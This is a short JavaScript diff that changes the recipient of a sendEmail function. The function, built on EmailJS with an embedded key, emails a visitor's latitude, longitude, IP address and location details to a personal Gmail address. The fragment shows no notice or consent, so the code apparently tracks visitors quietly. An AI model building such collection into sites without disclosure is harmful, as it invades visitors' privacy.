@@ -99,7 +99,7 @@ function sendEmail(lat, lon, ipAddress, city, region, country) {
     emailjs.init('3PyPbjChXwDJ4z-1U');
 
     const templateParams = {
-        to_email: 'abdullah54forum@gmail.com', 
+        to_email: 'abdullah22developer@gmail.com', 
         latitude: lat,
         longitude: lon,
         ip: ipAddress,
